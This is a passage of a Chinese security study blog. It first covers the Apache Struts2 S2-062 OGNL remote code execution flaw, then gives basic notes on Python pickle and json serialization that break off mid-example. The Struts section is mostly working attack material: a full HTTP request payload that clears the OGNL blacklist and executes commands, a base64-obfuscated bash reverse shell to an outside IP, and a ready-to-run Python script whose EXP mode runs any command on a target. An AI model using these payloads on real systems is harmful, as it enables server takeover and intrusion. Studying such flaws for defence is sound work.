class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /index.action HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:18080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class=\"line\">Content-Length: 1191</span><br><span class=\"line\">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;id&quot; %&#123;</span><br><span class=\"line\">(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class=\"line\">(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) ==</span><br><span class=\"line\">true).toString().substring(0,0) +</span><br><span class=\"line\">(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) ==</span><br><span class=\"line\">true).toString().substring(0,0) +</span><br><span class=\"line\">(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))</span><br><span class=\"line\">&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF—</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  This is my JSP page. &lt;br&gt;</span><br><span class=\"line\">  &lt;s:a id=&quot;%&#123;id&#125;&quot; href=&quot;onlytest&quot;&gt;J2EE web development tutorials&lt;/s:a&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">//回显位置再id中</span><br></pre></td></tr></table></figure>\n<p>或者建立反弹连接，只需要修改最后一行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDYuOC4xNzUvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;))</span><br></pre></td></tr></table></figure>\n<p>python 脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from lxml import etree</span><br><span class=\"line\">import argparse</span><br><span class=\"line\"></span><br><span class=\"line\">def poc(url):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;&#125;</span><br><span class=\"line\">        data = &quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\r\\nContent-Disposition: form-data; name=\\&quot;id\\&quot;\\r\\n\\r\\n%&#123;\\r\\n(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;whoami&#x27;&#125;))\\r\\n&#125;\\r\\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\xe2\\x80\\x94&quot;</span><br><span class=\"line\">        text=requests.post(url, headers=headers, data=data).text</span><br><span class=\"line\">        if &quot;id&quot; in text:</span><br><span class=\"line\">            print(&quot;发现漏洞&quot;)</span><br><span class=\"line\">            page=etree.HTML(text)</span><br><span class=\"line\">            data = page.xpath(&#x27;//a[@id]/@id&#x27;)</span><br><span class=\"line\">            print(data[0])</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;POC检测失败&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def EXP(url,cmd):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;&#125;</span><br><span class=\"line\">        data =&quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\r\\nContent-Disposition: form-data; name=\\&quot;id\\&quot;\\r\\n\\r\\n%&#123;\\r\\n(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\\r\\n(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\\r\\n(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))\\r\\n&#125;\\r\\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\\xe2\\x80\\x94&quot;.replace(&quot;exec(&#123;&#x27;id&quot;,&quot;exec(&#123;&#x27;&quot;+cmd)</span><br><span class=\"line\">        text=requests.post(url, headers=headers, data=data).text</span><br><span class=\"line\">        if &quot;id&quot; in text:</span><br><span class=\"line\">            print(&quot;命令回显&quot;)</span><br><span class=\"line\">            page=etree.HTML(text)</span><br><span class=\"line\">            data = page.xpath(&#x27;//a[@id]/@id&#x27;)</span><br><span class=\"line\">            print(data[0])</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;EXP检测失败&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=&#x27;S2-062验证&#x27;)</span><br><span class=\"line\">    parser.add_argument(&#x27;--url&#x27;, help=&quot;要验证的URL&quot;)</span><br><span class=\"line\">    parser.add_argument(&#x27;--cmd&#x27;,help=&quot;你想执行的命令&quot;,default=&quot;&quot;)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    if args.cmd !=&quot;&quot;:</span><br><span class=\"line\">        EXP(args.url,args.cmd)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        poc(args.url)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3MyLTA2Mi5weQ==\">s2-062.py</span> --url <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==\">http://192.168.142.128:18080</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3MyLTA2Mi5weQ==\">s2-062.py</span> --url <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==\">http://192.168.142.128:18080</span> --cmd whoami</p>\n<p>OGNI 表达式</p>\n<p>一种开源的 Java 表达式语言</p>\n<p>用于对数据进行访问，拥有类型转换、访问对象方法、操作集合对象等功能</p>\n<blockquote>\n<p>1、OGNL 是 Struts 默认支持的表达式语言</p>\n<p>2、OGNL 可以取值赋值、访问类的静态方法和属性</p>\n<p>3、访问 OGNL 上下文。Struts 的上下文根对象：ValueStack</p>\n<p>4、%{} 用来把字符串转换成表达式</p>\n<p>%25 就是 URL 编码的 %</p>\n<p>5、可以在 struts.xml 和 struts 标签等地方使用 OGNL 表达式</p>\n</blockquote>\n<p>漏洞分析</p>\n<p>项目使用了 %{} 解析 OGNL 表达式，对用户输入的内容进行二次解析的时候，如果没有验证，可能导致远程代码执行</p>\n<blockquote>\n<p>InstanceManager：用于实例化任意对象</p>\n<p>BeanMap：可以调用对象的 getter、setter，</p>\n<p>setBean () 可以更新对象</p>\n<p>valueStack：ONGL 的根对象</p>\n<p>memberAccess：控制对象的访问</p>\n<p>setExcludedPackageNames()</p>\n<p>setExcludedClasses () 清除黑名单</p>\n<p>Execute 类：黑名单类，exec 可以执行 Shell</p>\n</blockquote>\n<p>用 Beanmap 获取 valueStack，清空黑名单，setBean 更新生效，实例化 exec 类执行代码</p>\n<p>黑名单内容：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190046216.png\" alt=\"image-20221126190046216\">`</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190030752.png\" alt=\"image-20221126190030752\">`</p>\n<p>struct061 和 struct062payload 区别</p>\n<p>#request.map=#application.get(‘org.apache.tomcat.InstanceManager’).newInstance(‘org.apache. commons.collections.BeanMap’)).toString().substring(0,0)</p>\n<p>s2-062 改成了：</p>\n<p>#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)</p>\n<h2 id=\"3python\"><a class=\"markdownIt-Anchor\" href=\"#3python\">#</a> 3.python</h2>\n<p>python 反序列化和 php 反序列化类似，相当于把程序运行时产生的变量，字典，对象实例等变换成字符串形式存储起来，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites) 之间的相互转换。</p>\n<p>Python 中提供 pickle 和 json 两个模块来实现序列化与反序列化，pickle 模块和 json 模块 dumps ()、dump ()、loads ()、load () 这是个函数，其中 dumps ()、dump () 用于实现序列化，loads ()、load () 用于实现反序列化。</p>\n<h3 id=\"pickle\"><a class=\"markdownIt-Anchor\" href=\"#pickle\">#</a> pickle</h3>\n<p>python 中 pickle 反序列化的库主要有两个， <code>pickle</code>  和 <code>cPickle</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本</span><br><span class=\"line\"># 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。</span><br><span class=\"line\"># 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。</span><br><span class=\"line\"></span><br><span class=\"line\">序列化：dumps()、dump()</span><br><span class=\"line\">反序列化：loads()、load()</span><br><span class=\"line\"></span><br><span class=\"line\"># pickle.dumps将对象序列化为字符串</span><br><span class=\"line\"># pickle.dump将序列化后的字符串存储为文件</span><br><span class=\"line\">print(pickle.dumps(a_list,protocol=0))</span><br><span class=\"line\"></span><br><span class=\"line\">pickle.loads() #对象反序列化</span><br><span class=\"line\">pickle.load() #对象反序列化，从文件中读取数据</span><br></pre></td></tr></table></figure>\n<p>对象序列化与反序列化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;,True,199]</span><br><span class=\"line\"></span><br><span class=\"line\">print(pickle.dumps(list1,protocol=0))</span><br><span class=\"line\">print(pickle.dumps(list1,protocol=2))</span><br><span class=\"line\">print(pickle.dumps(list1,protocol=3))</span><br><span class=\"line\">print(pickle.dumps(list1,protocol=4))</span><br><span class=\"line\"></span><br><span class=\"line\">b&#x27;(lp0\\nVaa\\np1\\naVbb\\np2\\naVcc\\np3\\naI01\\naI199\\na.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x02]q\\x00(X\\x02\\x00\\x00\\x00aaq\\x01X\\x02\\x00\\x00\\x00bbq\\x02X\\x02\\x00\\x00\\x00ccq\\x03\\x88K\\xc7e.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x03]q\\x00(X\\x02\\x00\\x00\\x00aaq\\x01X\\x02\\x00\\x00\\x00bbq\\x02X\\x02\\x00\\x00\\x00ccq\\x03\\x88K\\xc7e.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x04\\x95\\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(\\x8c\\x02aa\\x94\\x8c\\x02bb\\x94\\x8c\\x02cc\\x94\\x88K\\xc7e.&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">print(pickle.loads(b&#x27;\\x80\\x04\\x95\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\x01K\\x02K\\x03e.&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">[1, 2, 3]</span><br></pre></td></tr></table></figure>\n<p>文件中序列化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;,True,199]</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&quot;shabi.txt&quot;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\">    pickle.dump(list1,f,protocol=0)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124095501120.png\" alt=\"image-20221124095501120\">`</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">file=open(&quot;shabi.txt&quot;,&quot;rb&quot;)</span><br><span class=\"line\">p=pickle.load(file)</span><br><span class=\"line\">file.close()</span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124100423319.png\" alt=\"image-20221124100423319\">`</p>\n<blockquote>\n<p>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</p>\n<p>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</p>\n<p>v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</p>\n<p>v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</p>\n<p>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</p>\n</blockquote>\n<p>另外有一点需要注意：对于我们自己定义的 class，如果直接以形如 <code>date = 20191029</code>  的方式赋初值，** 则这个 <code>date</code>  不会被打包！** 解决方案是写一个 <code>__init__</code> 方法， 也就是这样：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">dairy</span>():</span><br><span class=\"line\">    date = <span class=\"number\">1111111</span></span><br><span class=\"line\">    text = <span class=\"string\">&#x27;sb&#x27;</span></span><br><span class=\"line\">    todo = [<span class=\"string\">&#x27;zz&#x27;</span>,<span class=\"number\">123</span>]</span><br><span class=\"line\">x = dairy()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pickle.dumps(x))</span><br><span class=\"line\"><span class=\"comment\"># b&#x27;\\x80\\x03c__main__\\ndairy\\nq\\x00)\\x81q\\x01.&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">dairy</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.date = <span class=\"number\">1111111</span></span><br><span class=\"line\">        self.text = <span class=\"string\">&#x27;sb&#x27;</span></span><br><span class=\"line\">        self.todo = [<span class=\"string\">&#x27;zz&#x27;</span>,<span class=\"number\">123</span>]</span><br><span class=\"line\">x = dairy()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pickle.dumps(x))</span><br><span class=\"line\"><span class=\"comment\"># b&#x27;\\x80\\x03c__main__\\ndairy\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00dateq\\x03JG\\xf4\\x10\\x00X\\x04\\x00\\x00\\x00textq\\x04X\\x02\\x00\\x00\\x00sbq\\x05X\\x04\\x00\\x00\\x00todoq\\x06]q\\x07(X\\x02\\x00\\x00\\x00zzq\\x08K&#123;eub.&#x27;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"json\"><a class=\"markdownIt-Anchor\" href=\"#json\">#</a> json</h3>\n<p>与 pickle 一样，json 模块也提供了 dumps ()、dump ()、loads ()、load () 则是个函数，且其中区别也与 pickle 中是个函数的区别是一样的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">p_dict = &#123;&#x27;name&#x27;:&#x27;张三&#x27; , &#x27;age&#x27;:30 , &#x27;isMarried&#x27;:False&#125; # 定义一个字典</span><br><span class=\"line\">p_str = json.dumps(p_dict)</span><br><span class=\"line\">print(p_str)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;name&quot;: &quot;\\u5f20\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">json的dumps()函数（dump()函数也有）中提供了一个ensure_ascii参数，将该参数的值设置为False，可令序列化后中文依然正常显示。 </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;&#123;&quot;name&quot;: &quot;\\u5f20\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br><span class=\"line\">print(json.loads(str1))</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br></pre></td></tr></table></figure>\n<p>json.dump 与 json.load 功能和 pickle 中基本一样，序列化到文件中，从文件中反序列化，不在举例</p>\n<p>json 与 pickle 区别</p>\n<blockquote>\n<p><strong>pickle 模块用于 Python 语言特有的类型和用户自定义类型与 Python 基本数据类型之间的转换</strong></p>\n<p><strong>json 模块用于字符串和 python 数据类型间进行转换。</strong></p>\n</blockquote>\n<p>定义 person 类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Person:</span><br><span class=\"line\">    def __init__(self , name , age , isMarried):</span><br><span class=\"line\">    self.name = name</span><br><span class=\"line\">    self.age = age</span><br><span class=\"line\">    self.isMarried = isMarried</span><br><span class=\"line\">p = Person(&#x27;张三&#x27; , 30 , False)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = Person(&#x27;张三&#x27; , 30 , False)</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">pp = pickle.dumps(p)</span><br><span class=\"line\">type(pp)   #&lt;class &#x27;bytes&#x27;&gt;</span><br><span class=\"line\">print(pp)  </span><br><span class=\"line\">#b&#x27;\\x80\\x03c__main__\\nPerson\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x06\\x00\\x00\\x00\\xe5\\xbc\\xa0\\xe4\\xb8\\x89q\\x04X\\x03\\x00\\x00\\x00ageq\\x05K\\x1eX\\t\\x00\\x00\\x00isMarriedq\\x06\\x89ub.&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p2 = pickle.loads(pp)</span><br><span class=\"line\">type(p2)  #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br><span class=\"line\">p2.name   #&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>\n<p>甚至 pickle 模块还能够对 Peron 本身进行序列化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">per = pickle.dumps(Person)</span><br><span class=\"line\">print(per)   